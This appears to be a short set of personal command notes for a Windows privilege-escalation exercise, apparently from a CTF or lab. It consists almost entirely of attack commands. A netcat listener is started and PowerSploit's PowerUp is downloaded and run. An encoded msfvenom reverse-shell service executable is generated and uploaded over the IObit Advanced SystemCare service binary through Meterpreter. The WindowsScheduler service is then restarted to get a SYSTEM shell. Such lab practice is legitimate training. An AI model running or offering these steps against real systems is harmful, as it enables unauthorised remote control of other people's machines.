# Terminal
sudo nc -lvnp 4443
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
# Meterpreter
upload /home/kali/Desktop/PowerUp.ps1
load powershell 
powershell_shell
# Powershell
. .\powerUp.ps1
Invoke-AllChecks
# CanRestart => true
Stop-Service -Name "WindowsScheduler"
Get-Service -Name "WindowsScheduler"
# Terminal
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o WService.exe
.exe
# Meterpreter
upload /home/kali/ASCService.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\WService.exe"
# Powershell
Start-Service -Name "WindowsScheduler"


